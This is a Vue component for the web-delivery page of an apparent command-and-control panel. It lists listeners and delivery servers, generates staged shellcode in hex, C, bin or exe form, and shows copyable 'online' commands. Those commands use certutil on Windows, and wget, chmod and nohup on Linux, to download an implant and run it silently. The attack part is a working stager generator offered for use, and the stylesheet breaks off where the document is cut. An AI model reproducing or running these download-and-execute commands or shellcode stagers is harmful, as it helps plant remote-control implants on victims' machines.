<template>
  <div class="webdelivery-management">
    <!-- 头部区域 -->
    <div class="header-section">
      <div class="header-content">
        <h1 class="page-title">{{ t('gen.webManageTitle') }}</h1>
        <p class="page-subtitle">{{ t('gen.webManageSubtitle') }}</p>
      </div>
      <el-button
          type="primary"
          size="large"
          class="add-btn"
          @click="dialogVisible = true"
      >
        <el-icon><Plus /></el-icon>
        {{ t('gen.webAdd') }}
      </el-button>
    </div>

    <!-- 统计卡片 -->
    <div class="stats-cards">
      <el-card class="stat-card">
        <div class="stat-content">
          <el-icon class="stat-icon total-icon"><DataLine /></el-icon>
          <div class="stat-info">
            <div class="stat-value">{{ tableData.length }}</div>
            <div class="stat-label">{{ t('listener.total') }}</div>
          </div>
        </div>
      </el-card>

      <el-card class="stat-card">
        <div class="stat-content">
          <el-icon class="stat-icon active-icon"><CircleCheck /></el-icon>
          <div class="stat-info">
            <div class="stat-value">{{ activeDeliveries }}</div>
            <div class="stat-label">{{ t('listener.active') }}</div>
          </div>
        </div>
      </el-card>

      <el-card class="stat-card">
        <div class="stat-content">
          <el-icon class="stat-icon inactive-icon"><CircleClose /></el-icon>
          <div class="stat-info">
            <div class="stat-value">{{ inactiveDeliveries }}</div>
            <div class="stat-label">{{ t('listener.inactive') }}</div>
          </div>
        </div>
      </el-card>
    </div>

    <!-- 主表格 -->
    <el-card class="main-table-card" shadow="hover">
      <template #header>
        <div class="table-header">
          <h3 class="table-title">{{ t('gen.webListTitle') }}</h3>
          <div class="table-actions">
            <el-tooltip :content="t('common.refresh')" placement="top">
              <el-button
                  type="info"
                  size="small"
                  @click="getWebDeliveryList"
                  :loading="loading"
              >
                <el-icon><Refresh /></el-icon>
              </el-button>
            </el-tooltip>
          </div>
        </div>
      </template>

      <el-table
          :data="tableData"
          class="custom-table"
          v-loading="loading"
          :empty-text="t('gen.webEmpty')"
      >
        <el-table-column prop="ListenerConfig" :label="t('gen.listenerCol')" min-width="180">
          <template #default="{ row }">
            <div class="listener-cell">
              <el-icon class="listener-icon"><Connection /></el-icon>
              <div class="listener-content">
                <div class="listener-text">{{ row.ListenerConfig }}</div>
                <div class="listener-label">{{ t('gen.listenerCol') }}</div>
              </div>
            </div>
          </template>
        </el-table-column>

        <el-table-column prop="OS" :label="t('gen.os')" width="140">
          <template #default="{ row }">
            <el-tag
                :type="row.OS === 'windows' ? 'primary' : row.OS === 'linux' ? 'success' : 'info'"
                class="os-tag"
                effect="light"
                round
            >
              {{ row.OS }}
            </el-tag>
          </template>
        </el-table-column>

        <el-table-column prop="Arch" :label="t('gen.arch')" width="120">
          <template #default="{ row }">
            <div class="arch-cell">
              <el-icon class="arch-icon"><Cpu /></el-icon>
              <span class="arch-text">{{ row.Arch.toUpperCase() }}</span>
            </div>
          </template>
        </el-table-column>

        <el-table-column prop="Pass" :label="t('gen.onlinePwd')" width="150">
          <template #default="{ row }">
            <div class="password-cell">
              <el-icon class="password-icon"><Lock /></el-icon>
              <span class="password-text">{{ row.Pass || t('gen.notSet') }}</span>
            </div>
          </template>
        </el-table-column>

        <el-table-column prop="ListeningPort" :label="t('gen.listenPort')" width="120">
          <template #default="{ row }">
            <div class="port-cell">
              <el-tag type="info" effect="plain" class="port-tag">
                {{ row.ListeningPort }}
              </el-tag>
            </div>
          </template>
        </el-table-column>

        <el-table-column :label="t('common.status')" width="120">
          <template #default="{ row }">
            <div class="status-cell">
              <div
                  class="status-dot"
                  :class="{ 'status-active': row.Status === 1, 'status-inactive': row.Status === 2 }"
              ></div>
              <el-tag
                  :type="row.Status === 1 ? 'success' : 'danger'"
                  size="small"
                  class="status-tag"
                  effect="light"
              >
                {{ row.Status === 1 ? t('listener.running') : t('listener.stopped') }}
              </el-tag>
            </div>
          </template>
        </el-table-column>

        <el-table-column :label="t('common.actions')" width="280">
          <template #default="{ row }">
            <div class="action-buttons">
              <!-- 上线命令按钮 -->
              <el-popover
                  placement="top-start"
                  :width="row.OS === 'windows' ? 480 : 520"
                  trigger="click"
                  class="command-popover"
              >
                <template #reference>
                  <el-button
                      size="small"
                      type="success"
                      :disabled="row.Status !== 1"
                      class="action-btn"
                  >
                    <el-tooltip :content="t('gen.viewCmd')" placement="top">
                      <el-icon><Promotion /></el-icon>
                    </el-tooltip>
                  </el-button>
                </template>
                <div class="command-content">
                  <h4 class="command-title">{{ t('gen.onlineCmd') }}</h4>
                  <pre class="command-code">{{ generateCommand(row) }}</pre>
                  <div class="command-actions">
                    <el-button
                        size="small"
                        type="primary"
                        @click="copyToClipboard(generateCommand(row))"
                    >
                      <el-icon><CopyDocument /></el-icon>
                      {{ t('common.copy') }}
                    </el-button>
                  </div>
                </div>
              </el-popover>

              <!-- Shellcode生成 -->
              <el-tooltip
                  v-if="row.OS === 'windows' && row.Status === 1"
                  :content="t('gen.genShellcode')"
                  placement="top"
              >
                <el-button
                    size="small"
                    type="warning"
                    class="action-btn"
                    @click="openShellcodeDialog(row)"
                >
                  <el-icon><MagicStick /></el-icon>
                </el-button>
              </el-tooltip>

              <!-- 开启/关闭 -->
              <el-tooltip
                  :content="row.Status === 1 ? t('gen.stopService') : t('gen.startService')"
                  placement="top"
              >
                <el-button
                    size="small"
                    :type="row.Status === 1 ? 'primary' : 'success'"
                    class="action-btn"
                    @click="row.Status === 1 ? handleClose(row) : handleOpen(row)"
                >
                  <el-icon>
                    <component :is="row.Status === 1 ? VideoPause : VideoPlay" />
                  </el-icon>
                </el-button>
              </el-tooltip>

              <!-- 删除 -->
              <el-tooltip :content="t('common.delete')" placement="top">
                <el-button
                    size="small"
                    type="danger"
                    class="action-btn"
                    @click="handleDelete(row)"
                >
                  <el-icon><Delete /></el-icon>
                </el-button>
              </el-tooltip>
            </div>
          </template>
        </el-table-column>
      </el-table>
    </el-card>

    <!-- 新增对话框 -->
    <el-dialog
        v-model="dialogVisible"
        :title="t('gen.configWeb')"
        width="1000px"
        class="add-dialog"
        :close-on-click-modal="false"
    >
      <div class="dialog-content">
        <el-form :model="formData" label-position="top" class="config-form">
          <!-- Listener 选择 -->
          <el-form-item :label="t('gen.listenerCol')" required>
            <el-select
                v-model="formData.listener"
                :placeholder="t('gen.pickListener')"
                class="form-select"
                @visible-change="handleDropdown"
                :loading="loadingListeners"
                clearable
                filterable
                size="large"
                autocomplete="off"
            >
              <template #prefix>
                <el-icon><Connection /></el-icon>
              </template>
              <el-option
                  v-for="item in listenerOptions"
                  :key="item"
                  :label="item"
                  :value="item"
              >
                <div class="listener-option">
                  <el-icon class="option-icon"><Connection /></el-icon>
                  <span class="option-label">{{ item }}</span>
                </div>
              </el-option>
              <template #empty>
                <div class="empty-option">{{ t('gen.noListeners') }}</div>
              </template>
            </el-select>
            <div class="form-hint">{{ t('gen.listenerHint') }}</div>
          </el-form-item>

          <!-- 操作系统和架构 -->
          <!-- 操作系统和架构 -->
<div class="os-arch-container">
  <!-- 操作系统选择器 -->
  <el-form-item :label="t('gen.os')" required class="full-width">
    <div class="os-selector">
      <div
          v-for="os in osOptions"
          :key="os.value"
          class="os-option"
          :class="{ 'os-selected': formData.os === os.value }"
          @click="selectOS(os.value)"
      >
        <div class="os-icon-wrapper">
          <el-icon :class="['os-icon', `os-${os.value}`]">
            <component :is="os.icon" />
          </el-icon>
        </div>
        <div class="os-name">{{ os.label }}</div>
      </div>
    </div>
  </el-form-item>

  <!-- 架构选择器 -->
  <el-form-item :label="t('gen.arch')" required class="full-width">
    <el-select
        v-model="formData.arch"
        :placeholder="t('gen.pickArch')"
        :disabled="!formData.os"
        size="large"
        class="arch-select"
    >
      <template #prefix>
        <el-icon><Cpu /></el-icon>
      </template>
      <el-option
          v-for="arch in archOptions"
          :key="arch"
          :label="arch.toUpperCase()"
          :value="arch"
      >
        <div class="arch-option-item">
          <el-icon><Cpu /></el-icon>
          <span class="arch-label">{{ arch.toUpperCase() }}</span>
          <span class="arch-desc">{{ getArchDescription(arch) }}</span>
        </div>
      </el-option>
    </el-select>
  </el-form-item>
</div>

          <!-- 端口和文件名 -->
          <div class="row-group">
            <el-form-item :label="t('gen.listenPort')" required class="half-width">
              <el-input
                  v-model="formData.port"
                  :placeholder="t('gen.portExample')"
                  size="large"
                  clearable
              >
                <template #prefix>
                  <el-icon><Monitor /></el-icon>
                </template>
              </el-input>
              <div class="form-hint">{{ t('gen.webPortHint') }}</div>
            </el-form-item>

            <el-form-item :label="t('gen.fileName')" class="half-width">
              <el-input
                  v-model="formData.filename"
                  :placeholder="t('gen.fileNameExample')"
                  size="large"
                  clearable
              >
                <template #prefix>
                  <el-icon><Document /></el-icon>
                </template>
              </el-input>
              <div class="form-hint">{{ t('gen.fileNameHint') }}</div>
            </el-form-item>
          </div>

          <!-- 上线密码 -->
          <el-form-item :label="t('gen.connPwd')">
            <div class="password-input-wrapper">
              <el-input
                  v-model="formData.pass"
                  :placeholder="t('gen.connPwdOptional')"
                  type="password"
                  show-password
                  clearable
                  size="large"
                  class="password-input"
                  :maxlength="32"
                  autocomplete="new-password"
              >
                <template #prefix>
                  <el-icon><Lock /></el-icon>
                </template>
              </el-input>
              <el-tooltip :content="t('gen.genRandomPwd')" placement="top">
                <el-button
                    class="generate-password-btn"
                    @click="generateRandomPassword"
                    :icon="Refresh"
                    circle
                    size="small"
                />
              </el-tooltip>
            </div>
            <div class="form-hint">{{ t('gen.connPwdHint2') }}</div>
          </el-form-item>
        </el-form>
      </div>

      <template #footer>
        <div class="dialog-footer">
          <el-button @click="dialogVisible = false" :disabled="submitting">
            {{ t('common.cancel') }}
          </el-button>
          <el-button
              type="primary"
              @click="handleWebDelivery"
              :loading="submitting"
              :disabled="!isFormValid"
          >
            <template #default>
              <span v-if="!submitting">{{ t('gen.createWeb') }}</span>
              <span v-else>{{ t('gen.creating') }}</span>
            </template>
          </el-button>
        </div>
      </template>
    </el-dialog>

    <!-- Shellcode生成对话框 -->
    <el-dialog
        v-model="dialogVisible2"
        :title="t('gen.stageScTitle')"
        width="480px"
        class="shellcode-dialog"
        :close-on-click-modal="false"
    >
      <div class="dialog-content">
        <div class="shellcode-info">
          <div class="info-item">
            <span class="info-label">{{ t('gen.listenerCol') }}:</span>
            <span class="info-value">{{ selectedListener }}</span>
          </div>
          <div class="info-item">
            <span class="info-label">{{ t('gen.listenPort') }}:</span>
            <span class="info-value">{{ selectedPort }}</span>
          </div>
        </div>

        <el-form :model="selectedFormat" label-position="top" class="format-form">
          <el-form-item :label="t('gen.outputFormat')" required>
            <div class="format-grid">
              <div
                  v-for="format in formatOptions"
                  :key="format.value"
                  class="format-option"
                  :class="{ 'format-selected': selectedFormat.format === format.value }"
                  @click="selectedFormat.format = format.value"
              >
                <div class="format-icon">
                  <el-icon class="format-icon-svg">
                    <component :is="format.icon" />
                  </el-icon>
                </div>
                <div class="format-info">
                  <div class="format-name">{{ format.label }}</div>
                  <div class="format-desc">{{ format.description }}</div>
                </div>
                <el-icon
                    v-if="selectedFormat.format === format.value"
                    class="format-check"
                >
                  <Check />
                </el-icon>
              </div>
            </div>
          </el-form-item>
        </el-form>
      </div>

      <template #footer>
        <div class="dialog-footer">
          <el-button @click="dialogVisible2 = false">
            {{ t('common.cancel') }}
          </el-button>
          <el-button
              type="primary"
              @click="handleStageShellcode"
              :loading="generatinBackendTemplatecode"
              :disabled="!selectedFormat.format"
          >
            {{ t('gen.genDownload') }}
          </el-button>
        </div>
      </template>
    </el-dialog>
  </div>
</template>

<script setup lang="ts">
import { ref, reactive, computed, onMounted } from "vue"
import { ElMessage, ElMessageBox } from "element-plus"
import { useI18n } from 'vue-i18n'
import {
  Plus,
  Refresh,
  Connection,
  Cpu,
  Lock,
  Monitor,
  Document,
  CopyDocument,
  Promotion,
  MagicStick,
  VideoPlay,
  VideoPause,
  Delete,
  DataLine,
  CircleCheck,
  CircleClose,
  Check,
  Warning,
  SuccessFilled,
  Download
} from '@element-plus/icons-vue'

const { t } = useI18n()
import ClientAPI from "@/api/clients"

// 状态
const tableData = ref([])
const loading = ref(false)
const dialogVisible = ref(false)
const dialogVisible2 = ref(false)
const loadingListeners = ref(false)
const submitting = ref(false)
const generatinBackendTemplatecode = ref(false)

// 监听器选项
const listenerOptions = ref([])

// 操作系统选项
const osOptions = [
  { label: 'Windows', value: 'windows', icon: Monitor },
  { label: 'Linux', value: 'linux', icon: Monitor },
  { label: 'macOS', value: 'darwin', icon: Monitor }
]

// 架构映射
const archMapping: Record<string, string[]> = {
  windows: ['amd64', '386'],
  linux: ['amd64', '386', 'arm', 'arm64', 'loong64', 'mips', 'mipsle', 'mips64', 'mips64le'],
  darwin: ['amd64', 'arm64']
}

// 架构描述
const archDescriptions = computed<Record<string, string>>(() => ({
  'amd64': t('gen.archAmd64'),
  '386': t('gen.arch386'),
  'arm': t('gen.archArm'),
  'arm64': t('gen.archArm64'),
  'loong64': t('gen.archLoong64'),
  'mips': t('gen.archMips'),
  'mipsle': t('gen.archMipsle'),
  'mips64': t('gen.archMips64'),
  'mips64le': t('gen.archMips64le')
}))

// 格式选项
const formatOptions = computed(() => [
  { value: 'hex', label: t('gen.fmtHex'), icon: Warning, description: t('gen.fmtHexDesc') },
  { value: 'c', label: t('gen.fmtC'), icon: Document, description: t('gen.fmtCDesc') },
  { value: 'bin', label: t('gen.fmtBin'), icon: SuccessFilled, description: t('gen.fmtBinDesc') },
  { value: 'exe', label: t('gen.fmtExe'), icon: Download, description: t('gen.fmtExeDesc') }
])

// 表单数据
const formData = reactive({
  port: '',
  listener: '',
  os: '',
  arch: '',
  filename: '',
  pass: ''
})

// 架构选项
const archOptions = ref<string[]>([])

// 选中的行数据
const selectedListener = ref('')
const selectedPort = ref('')
const selectedFormat = reactive({
  format: ''
})

// 计算属性
const activeDeliveries = computed(() => {
  return (tableData.value as any[]).filter(item => item.Status === 1).length
})

const inactiveDeliveries = computed(() => {
  return (tableData.value as any[]).filter(item => item.Status === 2).length
})

const isFormValid = computed(() => {
  return formData.listener && formData.os && formData.arch && formData.port
})

// 方法
const getArchDescription = (arch: string) => {
  return archDescriptions.value[arch] || t('gen.archUnknown')
}

const generateCommand = (row: any) => {
  if (row.OS === 'windows') {
    return `certutil -urlcache -split -f ${row.ServerAddress} C:\\temp\\r.exe && C:\\temp\\r.exe ${row.Pass || ''}`
  } else {
    return `wget -P /tmp ${row.ServerAddress}; chmod +x /tmp/${row.FileName}; nohup /tmp/${row.FileName} ${row.Pass || ''} > /dev/null 2>&1 &`
  }
}

const handleDropdown = async (visible: boolean) => {
  if (visible && listenerOptions.value.length === 0) {
    loadingListeners.value = true
    try {
      const res = await ClientAPI.ShowListener()
      if (res.status === 200 && res.data.status === 200) {
        listenerOptions.value = res.data.data
      } else {
        ElMessage.error(res.data?.data || t('listener.loadFailed'))
      }
    } catch (error) {
      console.error('failed to load listeners:', error)
      ElMessage.error(t('listener.loadFailed'))
    } finally {
      loadingListeners.value = false
    }
  }
}

const selectOS = (os: string) => {
  formData.os = os
  formData.arch = ''
  archOptions.value = archMapping[os] || []
}

const generateRandomPassword = () => {
  // 仅使用字母数字，避免 shell 特殊字符导致命令行参数解析异常
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
  let password = ''
  for (let i = 0; i < 16; i++) {
    password += chars.charAt(Math.floor(Math.random() * chars.length))
  }
  formData.pass = password
  ElMessage.success(t('gen.randomPwdOk'))
}

const getWebDeliveryList = async () => {
  loading.value = true
  try {
    const res = await ClientAPI.GetWebDeliveryList()
    if (res.status === 200 && res.data.status === 200) {
      tableData.value = res.data.data
    } else {
      ElMessage.error(res.data?.data || t('gen.webListFailed'))
    }
  } catch (error) {
    console.error('failed to load WebDelivery list:', error)
    ElMessage.error(t('gen.webListFailed'))
  } finally {
    loading.value = false
  }
}

const handleWebDelivery = async () => {
  if (!isFormValid.value) {
    ElMessage.warning(t('listener.configIncomplete'))
    return
  }

  submitting.value = true
  try {
    const res = await ClientAPI.StartWebDelivery({
      listener: formData.listener,
      os: formData.os,
      arch: formData.arch,
      port: formData.port,
      filename: formData.filename,
      pass: formData.pass
    })

    if (res.status === 200 && res.data.status === 200) {
      ElMessage.success(t('gen.webCreated'))
      dialogVisible.value = false
      resetForm()
      await getWebDeliveryList()
    } else {
      ElMessage.error(res.data?.data || t('gen.createFailed'))
    }
  } catch (error) {
    console.error('failed to create WebDelivery:', error)
    ElMessage.error(t('gen.createFailed'))
  } finally {
    submitting.value = false
  }
}

const handleClose = async (row: any) => {
  try {
    const res = await ClientAPI.CloseWebDelivery({ port: row.ListeningPort })
    if (res.status === 200 && res.data.status === 200) {
      ElMessage.success(t('gen.serviceStopped'))
      await getWebDeliveryList()
    } else {
      ElMessage.error(res.data?.data || t('gen.stopFailed'))
    }
  } catch (error) {
    console.error('failed to stop WebDelivery:', error)
    ElMessage.error(t('gen.stopFailed'))
  }
}

const handleOpen = async (row: any) => {
  try {
    const res = await ClientAPI.OpenWebDelivery({ port: row.ListeningPort })
    if (res.status === 200 && res.data.status === 200) {
      ElMessage.success(t('gen.serviceStarted'))
      await getWebDeliveryList()
    } else {
      ElMessage.error(res.data?.data || t('gen.startFailed'))
    }
  } catch (error) {
    console.error('failed to start WebDelivery:', error)
    ElMessage.error(t('gen.startFailed'))
  }
}

const handleDelete = async (row: any) => {
  try {
    await ElMessageBox.confirm(
        t('gen.webDeleteConfirm', { port: row.ListeningPort }),
        t('listener.deleteTitle'),
        {
          confirmButtonText: t('common.confirm'),
          cancelButtonText: t('common.cancel'),
          type: 'warning'
        }
    )

    const res = await ClientAPI.DeleteWebDelivery({ port: row.ListeningPort })
    if (res.status === 200 && res.data.status === 200) {
      ElMessage.success(t('common.deleted'))
      await getWebDeliveryList()
    } else {
      ElMessage.error(res.data?.data || t('common.deleteFailed'))
    }
  } catch (error) {
    if (error !== 'cancel') {
      console.error('failed to delete WebDelivery:', error)
      ElMessage.error(t('common.deleteFailed'))
    }
  }
}

const openShellcodeDialog = (row: any) => {
  selectedListener.value = row.ListenerConfig
  selectedPort.value = row.ListeningPort
  selectedFormat.format = ''
  dialogVisible2.value = true
}

const handleStageShellcode = async () => {
  if (!selectedFormat.format) {
    ElMessage.warning(t('gen.pickFormat'))
    return
  }

  generatinBackendTemplatecode.value = true
  try {
    const res = await ClientAPI.StageShellCodeGen({
      listener: selectedListener.value,
      port: selectedPort.value,
      format: selectedFormat.format
    })

    if (res.status === 200) {
      // 处理文件下载
      const contentDisposition = res.headers['content-disposition'] || ''
      const matches = /filename[^;=\n]*=((['"]).*?\2|[^;\n]*)/.exec(contentDisposition)
      let fileName = matches && matches.length > 1
          ? decodeURIComponent(matches[1].replace(/['"]/g, ''))
          : `shellcode_${selectedListener.value}_${selectedPort.value}.${selectedFormat.format}`

      const blob = new Blob([res.data], { type: res.headers['content-type'] })
      const downloadElement = document.createElement('a')
      const href = window.URL.createObjectURL(blob)

      downloadElement.href = href
      downloadElement.download = fileName
      document.body.appendChild(downloadElement)
      downloadElement.click()
      document.body.removeChild(downloadElement)
      window.URL.revokeObjectURL(href)

      ElMessage.success(t('gen.scOk'))
      dialogVisible2.value = false
    } else {
      ElMessage.error(t('gen.generateFailed'))
    }
  } catch (error) {
    console.error('failed to generate shellcode:', error)
    ElMessage.error(t('gen.generateFailed'))
  } finally {
    generatinBackendTemplatecode.value = false
  }
}

const copyToClipboard = (text: string) => {
  navigator.clipboard.writeText(text).then(() => {
    ElMessage.success(t('common.copied'))
  }).catch(() => {
    ElMessage.error(t('gen.copyFailed'))
  })
}

const resetForm = () => {
  formData.port = ''
  formData.listener = ''
  formData.os = ''
  formData.arch = ''
  formData.filename = ''
  formData.pass = ''
  archOptions.value = []
}

onMounted(async () => {
  await getWebDeliveryList()
})
</script>

<style scoped>
.webdelivery-management {
  padding: 24px;
  background: linear-gradient(135deg, #f5f7fa 0%, #e4e7ed 100%);
  min-height: calc(100vh - 60px);
}

.header-section {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 32px;
  flex-wrap: wrap;
  gap: 20px;
}

.header-content {
  flex: 1;
}

.page-title {
  margin: 0;
  font-size: 32px;
  font-weight: 700;
  color: #2c3e50;
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  background-clip: text;
  letter-spacing: 1px;
}

.page-subtitle {
  margin: 8px 0 0 0;
  font-size: 15px;
  color: #7f8c8d;
}

.add-btn {
  height: 44px;
  padding: 0 24px;
  border-radius: 10px;
  font-weight: 600;
  box-shadow: 0 4px 12px rgba(102, 126, 234, 0.3);
  transition: all 0.3s;
}

.add-btn:hover {
  transform: translateY(-2px);
  box-shadow: 0 6px 20px rgba(102, 126, 234, 0.4);
}

.add-btn .el-icon {
  margin-right: 8px;
  font-size: 18px;
}

/* 统计卡片 */
.stats-cards {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: 16px;
  margin-bottom: 24px;
}

.stat-card {
  border-radius: 12px;
  border: 1px solid #ebeef5;
  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
  transition: all 0.3s;
  cursor: pointer;
}

.stat-card:hover {
  transform: translateY(-2px);
  box-shadow: 0 6px 16px rgba(0, 0, 0, 0.1);
}

.stat-content {
  display: flex;
  align-items: center;
  gap: 16px;
  padding: 8px 0;
}

.stat-icon {
  width: 48px;
  height: 48px;
  border-radius: 12px;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 24px;
}

.total-icon {
  background: rgba(64, 158, 255, 0.1);
  color: #409eff;
}

.active-icon {
  background: rgba(103, 194, 58, 0.1);
  color: #67c23a;
}

.inactive-icon {
  background: rgba(245, 108, 108, 0.1);
  color: #f56c6c;
}

.stat-info {
  flex: 1;
}

.stat-value {
  font-size: 24px;
  font-weight: 700;
  color: #2c3e50;
  line-height: 1;
}

.stat-label {
  font-size: 13px;
  color: #7f8c8d;
  margin-top: 4px;
}

/* 主表格 */
.main-table-card {
  border-radius: 16px;
  border: 1px solid #ebeef5;
  margin-bottom: 24px;
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08) !important;
}

.main-table-card :deep(.el-card__header) {
  border-bottom: 1px solid #ebeef5;
  padding: 20px 24px;
  background: linear-gradient(90deg, #f8f9fa 0%, #fff 100%);
}

.table-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.table-title {
  margin: 0;
  font-size: 18px;
  font-weight: 600;
  color: #303133;
  display: flex;
  align-items: center;
  gap: 8px;
}

.table-title:before {
  content: '';
  display: block;
  width: 4px;
  height: 18px;
  background: linear-gradient(180deg, #409eff 0%, #79bbff 100%);
  border-radius: 2px;
}

.custom-table {
  font-size: 13px;
}

.custom-table :deep(.el-table__header-wrapper th) {
  background: #f8f9fa;
  font-weight: 600;
  color: #495057;
  border-bottom: 2px solid #e9ecef;
}

.custom-table :deep(.el-table__row:hover) {
  background-color: #f8fafc;
}

.custom-table :deep(.el-table__row:hover td) {
  background-color: #f8fafc !important;
}

/* 表格单元格样式 */
.listener-cell {
  display: flex;
  align-items: center;
  gap: 10px;
}

.listener-icon {
  color: #409eff;
  font-size: 16px;
  flex-shrink: 0;
}

.listener-content {
  flex: 1;
  min-width: 0;
}

.listener-text {
  font-family: 'Monaco', 'Consolas', monospace;
  font-size: 13px;
  color: #2c3e50;
  word-break: break-all;
}

.listener-label {
  font-size: 11px;
  color: #7f8c8d;
  margin-top: 2px;
}

.os-tag {
  font-weight: 600;
  font-size: 12px;
  padding: 4px 12px;
  letter-spacing: 0.5px;
}

.arch-cell {
  display: flex;
  align-items: center;
  gap: 8px;
}

.arch-icon {
  color: #909399;
  font-size: 14px;
}

.arch-text {
  font-family: 'Monaco', 'Consolas', monospace;
  font-weight: 500;
}

.password-cell {
  display: flex;
  align-items: center;
  gap: 8px;
}

.password-icon {
  color: #e6a23c;
  font-size: 14px;
}

.password-text {
  font-family: 'Monaco', 'Consolas', monospace;
  font-size: 12px;
  color: #e6a23c;
  font-weight: 500;
}

.port-cell {
  display: flex;
  align-items: center;
}

.port-tag {
  font-family: 'Monaco', 'Consolas', monospace;
  font-weight: 600;
}

.status-cell {
  display: flex;
  align-items: center;
  gap: 8px;
  justify-content: center;
}

.status-dot {
  width: 8px;
  height: 8px;
  border-radius: 50%;
}

.status-active {
  background: #67c23a;
  box-shadow: 0 0 0 2px rgba(103, 194, 58, 0.2);
  animation: pulse 2s infinite;
}

.status-inactive {
  background: #f56c6c;
  box-shadow: 0 0 0 2px rgba(245, 108, 108, 0.2);
}

@keyframes pulse {
  0%, 100% {
    box-shadow: 0 0 0 2px rgba(103, 194, 58, 0.2);
  }
  50% {
    box-shadow: 0 0 0 4px rgba(103, 194, 58, 0.1);
  }
}

/* 操作按钮 */
.action-buttons {
  display: flex;
  gap: 6px;
}

.action-btn {
  width: 32px;
  height: 32px;
  padding: 0;
  transition: all 0.3s;
}

.action-btn:hover {
  transform: translateY(-2px);
  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
}

.action-btn:disabled {
  opacity: 0.5;
  cursor: not-allowed;
}

/* 命令弹窗 */
.command-popover {
  border-radius: 8px;
}

.command-content {
  padding: 4px;
}

.command-title {
  margin: 0 0 12px 0;
  font-size: 14px;
  font-weight: 600;
  color: #2c3e50;
}

.command-code {
  background: #2d2d2d;
  color: #f8f8f2;
  padding: 16px;
  border-radius: 8px;
  font-family: 'Monaco', 'Consolas', monospace;
  font-size: 13px;
  line-height: 1.5;
  overflow-x: auto;
  margin-bottom: 12px;
  white-space: pre-wrap;
  word-break: break-all;
}

.command-actions {
  display: flex;
  justify-content: flex-end;
}

.add-dialog :deep(.el-dialog) {
  width: 1000px !important;
  max-width: 95vw !important;
}

.add-dialog,
.shellcode-dialog {
  border-radius: 16px;
  overflow: hidden;
}

.add-dialog :deep(.el-dialog__header),
.shellcode-dialog :deep(.el-dialog__header) {
  margin: 0;
  padding: 0;
}

.dialog-content {
  padding: 0 8px;
}

.config-form :deep(.el-form-item) {
  margin-bottom: 24px;
}

.config-form :deep(.el-form-item__label) {
  font-size: 14px;
  font-weight: 600;
  color: #2c3e50;
  padding-bottom: 8px;
  display: block;
}

/* 确保表单项不被截断 */
.config-form :deep(.el-form-item__content) {
  overflow: visible;
}

/* 操作系统和架构容器 */
.os-arch-container {
  width: 100%;
  display: flex;
  gap: 16px;
  align-items: flex-start;
  flex-wrap: wrap;
}

/* 使左右两块在大屏并排，移动端回落为竖排 */
.os-arch-container .full-width {
  flex: 1 1 320px;
  min-width: 240px;
  margin-bottom: 24px;
}

/* 操作系统区域更灵活，优先占用剩余空间 */
.os-selector {
  flex: 1 1 480px;
  min-width: 240px;
}

/* 架构选择固定宽度，避免覆盖左侧卡片 */
.arch-select {
  flex: 0 0 280px;
  min-width: 200px;
  max-width: 360px;
}

/* 确保操作系统卡片处于正常文档流且可见 */
.os-option {
  position: relative;
  z-index: 1;
}

/* 下拉面板置顶，避免遮挡左侧卡片 */
.arch-select :deep(.el-select-dropdown) {
  z-index: 2050;
}

/* 全宽度表单项 */
.full-width {
  width: 100%;
  margin-bottom: 24px; /* 增加下边距 */
}

.full-width:last-child {
  margin-bottom: 0; /* 最后一个不需要下边距 */
}

/* 操作系统选择器调整为上下排列 */
.os-selector {
  display: flex;
  gap: 12px;
  margin-bottom: 12px;
  flex-wrap: nowrap;
}

.os-option {
  flex: 1;
  padding: 16px 12px;
  border: 2px solid #e9ecef;
  border-radius: 10px;
  cursor: pointer;
  transition: all 0.3s;
  background: #f8f9fa;
  text-align: center;
  min-height: 80px;
}

.os-option:hover {
  border-color: #409eff;
  background: rgba(64, 158, 255, 0.05);
  transform: translateY(-2px);
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.06);
}

.os-selected {
  border-color: #409eff !important;
  background: rgba(64, 158, 255, 0.1) !important;
  box-shadow: 0 4px 12px rgba(64, 158, 255, 0.2);
}

.os-icon-wrapper {
  width: 36px;
  height: 36px;
  margin: 0 auto 8px;
  border-radius: 10px;
  display: flex;
  align-items: center;
  justify-content: center;
}

.os-icon {
  font-size: 20px;
}

.os-windows {
  color: #00a4ef;
}

.os-linux {
  color: #333;
}

.os-darwin {
  color: #999;
}

.os-name {
  font-size: 14px;
  font-weight: 600;
  color: #2c3e50;
}

/* 架构选择器 */
.arch-select {
  width: 100%;
}

.arch-select :deep(.el-input__wrapper) {
  border-radius: 10px;
  padding-left: 12px;
  height: 48px;
  width: 100%;
}

.arch-option-item {
  display: flex;
  align-items: center;
  gap: 10px;
  padding: 8px 0;
}

.arch-option-item .el-icon {
  color: #409eff;
  font-size: 16px;
}

.arch-label {
  font-size: 14px;
  font-weight: 500;
  min-width: 60px;
}

.arch-desc {
  font-size: 11px;
  color: #909399;
  flex: 1;
  text-align: right;
}

/* 响应式调整 */
@media (max-width: 768px) {
  .os-selector {
    flex-direction: column;
  }

  .os-option {
    min-height: 70px;
    padding: 12px;
  }
}

/* 如果需要确保两个部分之间有足够间距 */
.os-arch-container .el-form-item {
  width: 100%;
}

/* 操作系统选择器 */
.os-selector {
  display: flex;
  gap: 12px;
}

.os-option {
  flex: 1;
  padding: 16px 12px;
  border: 2px solid #e9ecef;
  border-radius: 10px;
  cursor: pointer;
  transition: all 0.3s;
  background: #f8f9fa;
  text-align: center;
}

.os-option:hover {
  border-color: #409eff;
  background: rgba(64, 158, 255, 0.05);
  transform: translateY(-2px);
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.06);
}

.os-selected {
  border-color: #409eff !important;
  background: rgba(64, 158, 255, 0.1) !important;
  box-shadow: 0 4px 12px rgba(64, 158, 255, 0.2);
}

.os-icon-wrapper {
  width: 36px;
  height: 36px;
  margin: 0 auto 8px;
  border-radius: 10px;
  display: flex;
  align-items: center;
  justify-content: center;
}

.os-icon {
  font-size: 20px;
}

.os-windows {
